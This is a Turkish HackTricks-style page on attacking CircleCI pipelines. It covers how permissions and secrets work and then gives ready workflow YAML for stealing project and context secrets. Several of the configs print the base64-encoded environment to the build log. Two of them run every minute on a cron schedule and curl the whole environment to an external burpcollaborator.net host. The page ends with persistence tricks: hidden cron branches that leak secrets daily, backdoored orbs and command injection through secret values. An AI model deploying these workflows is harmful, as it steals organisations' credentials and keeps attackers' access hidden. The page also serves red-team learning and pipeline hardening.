# CircleCI Güvenliği

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

### Temel Bilgiler

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) sürekli entegrasyon platformudur; burada ne yapmak istediğinizi ve ne zaman yapmak istediğinizi belirten **şablonlar** tanımlayabilirsiniz. Bu şekilde, örneğin, **testleri** veya **dağıtımları** doğrudan **repo ana dalınızdan** **otomatikleştirebilirsiniz**.

### İzinler

**CircleCI**, giriş yapan **hesap** ile ilgili github ve bitbucket'tan **izinleri devralır**.\
Testlerimde, eğer **github'daki repo üzerinde yazma izinleriniz varsa**, **CircleCI'de proje ayarlarını yönetebileceğinizi** kontrol ettim (yeni ssh anahtarları ayarlamak, proje api anahtarlarını almak, yeni CircleCI yapılandırmaları ile yeni dallar oluşturmak...).

Ancak, **repo'yu CircleCI projesine dönüştürmek için** bir **repo yöneticisi** olmanız gerekir.

### Ortam Değişkenleri ve Gizli Anahtarlar

[**belgelere**](https://circleci.com/docs/2.0/env-vars/) göre, bir iş akışı içinde **ortam değişkenlerine değer yüklemenin** farklı yolları vardır.

#### Yerleşik ortam değişkenleri

CircleCI tarafından çalıştırılan her konteyner, her zaman [**belgelere tanımlanmış özel ortam değişkenlerine**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) sahip olacaktır; örneğin `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` veya `CIRCLE_USERNAME`.

#### Düz metin

Bunları bir **komut** içinde düz metin olarak tanımlayabilirsiniz:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
**Çalışma ortamı** içinde açık metin olarak tanımlayabilirsiniz:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
**build-job ortamı** içinde açık metin olarak tanımlayabilirsiniz:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
**bir konteynerin ortamında** açık metin olarak beyan edebilirsiniz:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
#### Proje Gizli Bilgileri

Bunlar, yalnızca **proje** (her **dal** tarafından) **erişilebilir** olan **gizli bilgilerdir**.\
Onları _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_ adresinde **tanımlanmış** olarak görebilirsiniz.

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
"**Değişkenleri İçe Aktar**" işlevi, bu projeye **diğer projelerden değişkenleri içe aktarmaya** olanak tanır.
{% endhint %}

#### Bağlam Gizli Bilgileri

Bunlar **örgüt genelinde** gizli bilgilerdir. **Varsayılan olarak, herhangi bir repo** burada saklanan **herhangi bir gizli bilgiye** erişebilecektir:

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
Ancak, gizli bilgilere yalnızca belirli kişilere erişim vermek için **farklı bir grup** (Tüm üyeler yerine) **seçilebilir**.\
Bu, gizli bilgilerin güvenliğini **artırmanın** en iyi yollarından biridir; herkesin erişmesine izin vermek yerine yalnızca bazı kişilerin erişmesine izin vermektir.
{% endhint %}

### Saldırılar

#### Açık Metin Gizli Bilgilerini Arama

Eğer **VCS'ye** (github gibi) **erişiminiz** varsa, her **repo üzerindeki her dalın** `.circleci/config.yml` dosyasını kontrol edin ve orada saklanan potansiyel **açık metin gizli bilgileri** **arama** yapın.

#### Gizli Çevre Değişkenleri ve Bağlam Sıralaması

Kodu kontrol ederek, her `.circleci/config.yml` dosyasında **kullanılan tüm gizli bilgi adlarını** bulabilirsiniz. Ayrıca, bu dosyalardan **bağlam adlarını** alabilir veya bunları web konsolunda kontrol edebilirsiniz: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

#### Proje gizli bilgilerini dışarı aktarma

{% hint style="warning" %}
Tüm proje ve bağlam **GİZLİ BİLGİLERİNİ** **dışarı aktarmak** için, **tüm github örgütünde yalnızca 1 repo** üzerinde **YAZMA** erişimine sahip olmanız **yeterlidir** (_ve hesabınızın bağlamlara erişimi olmalıdır, ancak varsayılan olarak herkes her bağlama erişebilir_).
{% endhint %}

{% hint style="danger" %}
"**Değişkenleri İçe Aktar**" işlevi, bu projeye **diğer projelerden değişkenleri içe aktarmaya** olanak tanır. Bu nedenle, bir saldırgan **tüm repo'lardan tüm proje değişkenlerini içe aktarabilir** ve ardından **hepsini birlikte dışarı aktarabilir**.
{% endhint %}

Tüm proje gizli bilgileri her zaman işlerin çevresinde ayarlanır, bu nedenle yalnızca çevreyi çağırmak ve base64 ile obfuscate etmek, **iş akışları web günlük konsolunda** gizli bilgileri dışarı aktaracaktır:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Eğer **web konsoluna erişiminiz yoksa** ama **repo'ya erişiminiz varsa** ve CircleCI'nin kullanıldığını biliyorsanız, sadece **her dakika tetiklenen** ve **gizli bilgileri harici bir adrese sızdıran** bir **iş akışı oluşturabilirsiniz**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
#### Bağlam Gizli Bilgilerini Sızdırma

**bağlam adını belirtmeniz gerekir** (bu aynı zamanda proje gizli bilgilerini de sızdıracaktır):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Eğer **web konsoluna erişiminiz yoksa** ama **repo'ya erişiminiz varsa** ve CircleCI'nin kullanıldığını biliyorsanız, her **dakika tetiklenen** ve **gizli bilgileri harici bir adrese sızdıran** bir **iş akışını** sadece **değiştirebilirsiniz**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Yeni bir `.circleci/config.yml` oluşturmak **bir circleci build'ini tetiklemek için yeterli değildir**. **Bunu circleci konsolunda bir proje olarak etkinleştirmeniz gerekir**.
{% endhint %}

#### Buluta Kaçış

**CircleCI**, **build'lerinizi kendi makinelerinde veya kendi makinelerinizde çalıştırma** seçeneği sunar.\
Varsayılan olarak, onların makineleri GCP'de bulunmaktadır ve başlangıçta ilgili bir şey bulamayacaksınız. Ancak, bir kurban **kendi makinelerinde (potansiyel olarak, bir bulut ortamında)** görevleri çalıştırıyorsa, üzerinde ilginç bilgiler bulunan bir **bulut meta veri uç noktası** bulabilirsiniz.

Önceki örneklerde her şeyin bir docker konteyneri içinde başlatıldığını unutmayın, ancak ayrıca **bir VM makinesi başlatmasını isteyebilirsiniz** (farklı bulut izinlerine sahip olabilir):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Veya uzaktan bir docker hizmetine erişimi olan bir docker konteyneri:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
#### Süreklilik

* **Kullanıcı token'ları oluşturmak** mümkündür **CircleCI**'de API uç noktalarına kullanıcı erişimi ile erişmek için.
* _https://app.circleci.com/settings/user/tokens_
* **Proje token'ları oluşturmak** mümkündür, token'a verilen izinlerle projeye erişmek için.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Projelere **SSH anahtarları eklemek** mümkündür.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Her gün tüm **context env** değişkenlerini **sızdıran** beklenmedik bir projede **gizli dalda bir cron işi oluşturmak** mümkündür.
* Ya da her gün tüm context ve **projelerin sırlarını** **sızdıran** bilinen bir işi bir dalda oluşturmak / değiştirmek mümkündür.
* Eğer bir github sahibiyseniz, **doğrulanmamış orb'lere izin verebilir** ve bir işi **arka kapı** olarak yapılandırabilirsiniz.
* Bazı görevlerde bir **komut enjeksiyonu açığı** bulabilir ve bir **sır** değerini değiştirerek **komutlar enjekte** edebilirsiniz.
